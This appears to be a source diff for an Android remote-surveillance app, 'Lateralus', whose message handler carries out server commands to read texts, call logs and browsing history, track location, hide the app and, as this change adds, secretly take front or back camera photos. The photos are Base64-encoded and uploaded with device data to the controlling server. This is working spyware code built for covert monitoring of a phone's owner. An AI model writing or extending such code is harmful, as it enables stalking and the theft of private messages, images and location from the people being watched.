@@ -5,8 +5,11 @@ import android.content.Context;
 import android.location.Location;
 import android.os.Handler;
 import android.os.Looper;
+import android.util.Base64;
 import android.util.Log;
 
+import xyz.lateralus.components.camera.PhotoTaker;
+import xyz.lateralus.components.camera.PhotoTakerListener;
 import xyz.lateralus.components.location.LocDelegate;
 import xyz.lateralus.components.location.LocationReader;
 import xyz.lateralus.components.network.Network;
@@ -26,13 +29,15 @@ public class LateralusMessageHandler {
 
     public static final String KEY_CMD       = "command";
     public static final String KEY_ROOT      = "json";
+    public static final String KEY_PHOTO     = "photo";
     public static final String KEY_MSG       = "message";
     public static final String KEY_ERROR_MSG = "error_message";
 
     public static final String CMD_GET_TEXT_MESSAGES = "get_text_messages";
     public static final String CMD_GET_PHONECALLS    = "get_phonecalls";
     public static final String CMD_GET_INTERNET_HIST = "get_internet_history";
-    public static final String CMD_TAKE_PIC       = "take_picture";
+    public static final String CMD_TAKE_PIC_FRONT    = "take_picture_front";
+    public static final String CMD_TAKE_PIC_BACK     = "take_picture_back";
     public static final String CMD_GET_LOCATION   = "get_location";
     public static final String CMD_START_TRACKING = "start_tracking";
     public static final String CMD_STOP_TRACKING  = "stop_tracking";
@@ -41,9 +46,12 @@ public class LateralusMessageHandler {
     public static final String CMD_HIDE_APP = "hide_app";
 
     private Context _ctx;
-    private static LocationDelegate _locDelegate = null;
-    private static LocationReader _locReader = null;
     private static Handler _handler;
+
+    private static LocationDelegate _locDelegate = null;
+    private static LocationReader   _locReader = null;
+    private static PhotoTaker       _picTaker = null;
+    private static PhotoDelegate    _photoDelegate = null;
 
     public LateralusMessageHandler(Context ctx){
         _ctx = ctx;
@@ -65,8 +73,9 @@ public class LateralusMessageHandler {
                 case CMD_GET_INTERNET_HIST:
                     cmdGetInternetHistory();
                     break;
-                case CMD_TAKE_PIC:
-                    cmdTakePicture();
+                case CMD_TAKE_PIC_FRONT:
+                case CMD_TAKE_PIC_BACK:
+                    cmdTakePicture(cmd);
                     break;
                 case CMD_GET_LOCATION:
                 case CMD_START_TRACKING:
@@ -79,14 +88,16 @@ public class LateralusMessageHandler {
                     break;
                 default:
                     Log.e(TAG, "Invalid Command: " + cmd);
-                    // TODO send error message
+                    sendLateralusErrorMessage(_ctx, "Invalid command from server: " + cmd);
             }
         }
         catch(JSONException e){
-            Log.e(TAG, "Error with the JSON from gcm request");
+            Log.e(TAG, "JSON Error from GCM request");
             e.printStackTrace();
         }
     }
+
+    /* -------- Commands -------- */
 
     private void cmdGetTextMessages(){
         try {
@@ -150,11 +161,22 @@ public class LateralusMessageHandler {
         });
     }
 
-    private void cmdTakePicture(){
-        // TODO
+    private void cmdTakePicture(final String cmd){
+        if(_photoDelegate == null){
+            _photoDelegate = new PhotoDelegate();
+        }
+        _handler.post(new Runnable() {
+            @Override
+            public void run() {
+                if(_picTaker == null) {
+                    _picTaker = new PhotoTaker(_ctx, _photoDelegate);
+                }
+                _picTaker.takePhoto((cmd.equals(CMD_TAKE_PIC_FRONT)) ? PhotoTaker.FRONT : PhotoTaker.BACK);
+            }
+        });
     }
 
-    private  void cmdLocation(final String cmd){
+    private void cmdLocation(final String cmd){
         _handler.post(new Runnable() {
             @Override
             public void run() {
@@ -179,6 +201,39 @@ public class LateralusMessageHandler {
         });
     }
 
+    /* -------- Send Messages -------- */
+
+    public static void sendLateralusMessage(Context ctx, String msg){
+        try{
+            JSONArray jsonArray = new JSONArray();
+            DeviceReader dr = new DeviceReader(ctx);
+            jsonArray.put(dr.getData());
+            jsonArray.put(new JSONObject().put(KEY_MSG, msg));
+            JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
+            Network.fireJsonData(Network.API_PUT, root);
+        }
+        catch(Exception e){
+            Log.e(TAG, "JSON Error");
+            e.printStackTrace();
+        }
+    }
+
+    public static void sendLateralusErrorMessage(Context ctx, String msg){
+        try{
+            JSONArray jsonArray = new JSONArray();
+            DeviceReader dr = new DeviceReader(ctx);
+            jsonArray.put(dr.getData());
+            jsonArray.put(new JSONObject().put(KEY_ERROR_MSG, msg));
+            JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
+            Network.fireJsonData(Network.API_PUT, root);
+        }
+        catch(Exception e){
+            Log.e(TAG, "JSON Error");
+            e.printStackTrace();
+        }
+    }
+
+    /* --------- Location Delegate -------- */
 
     private class LocationDelegate implements LocDelegate {
 
@@ -196,41 +251,46 @@ public class LateralusMessageHandler {
                 }
             }
             catch(Exception e){
-                Log.e(TAG, "Could not create location json from locationReceived");
+                Log.e(TAG, "JSON Error");
                 e.printStackTrace();
             }
         }
 
         @Override
         public void onErrorReceived(String msg) {
-            try{
+            sendLateralusErrorMessage(_ctx, msg);
+        }
+
+        @Override
+        public void onMessageReceived(String msg) {
+            sendLateralusMessage(_ctx, msg);
+        }
+    }
+
+    /* ------- Photo Taker Delegate -------- */
+
+    private class PhotoDelegate implements PhotoTakerListener{
+
+        @Override
+        public void onPhotoTaken(byte[] photoBytes) {
+            try {
+                String photoStr = Base64.encodeToString(photoBytes, Base64.NO_WRAP);
                 JSONArray jsonArray = new JSONArray();
                 DeviceReader dr = new DeviceReader(_ctx);
                 jsonArray.put(dr.getData());
-                jsonArray.put(new JSONObject().put(KEY_ERROR_MSG, msg));
+                jsonArray.put(new JSONObject().put(KEY_PHOTO, photoStr));
                 JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
                 Network.fireJsonData(Network.API_PUT, root);
             }
             catch(Exception e){
-                Log.e(TAG, "Could not create error json from errorReceived");
+                Log.e(TAG, "JSON Error");
                 e.printStackTrace();
             }
         }
 
         @Override
-        public void onMessageReceived(String msg) {
-            try{
-                JSONArray jsonArray = new JSONArray();
-                DeviceReader dr = new DeviceReader(_ctx);
-                jsonArray.put(dr.getData());
-                jsonArray.put(new JSONObject().put(KEY_MSG, msg));
-                JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
-                Network.fireJsonData(Network.API_PUT, root);
-            }
-            catch(Exception e){
-                Log.e(TAG, "Could not create message json from messageReceived");
-                e.printStackTrace();
-            }
+        public void onError(String msg) {
+            sendLateralusErrorMessage(_ctx, msg);
         }
     }
 
